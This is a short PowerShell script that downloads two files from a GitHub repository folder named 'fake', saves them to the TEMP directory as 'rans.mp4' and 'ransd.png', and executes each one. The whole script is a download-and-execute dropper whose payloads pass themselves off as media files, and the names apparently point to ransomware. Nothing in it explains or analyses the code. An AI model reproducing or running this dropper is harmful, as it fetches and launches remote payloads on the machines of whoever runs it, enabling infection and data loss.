$url1 = "https://github.com/cia168168/folder/raw/main/fake/rans.mp4"
$output1 = "$env:TEMP\rans.mp4"
Invoke-WebRequest -Uri $url1 -OutFile $output1
& $output1
$url2 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
$output2 = "$env:TEMP\ransd.png"
Invoke-WebRequest -Uri $url2 -OutFile $output2
& $output2
